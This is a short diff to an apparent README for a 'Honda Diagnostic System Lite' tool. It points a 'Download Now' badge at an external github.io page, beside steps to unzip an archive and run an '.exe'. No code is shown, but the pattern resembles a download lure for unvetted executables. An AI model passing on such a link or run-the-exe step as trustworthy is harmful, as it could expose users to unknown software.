@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://honda-diagnostic-system-lite.github.io/.github/)
 
 ## 📸 Overview
 <img width="800" height="427" alt="hds-lite-dashboard" src="https://github.com/user-attachments/assets/b47e2043-adcc-49ee-8e27-22bf7b1c2cc4" />
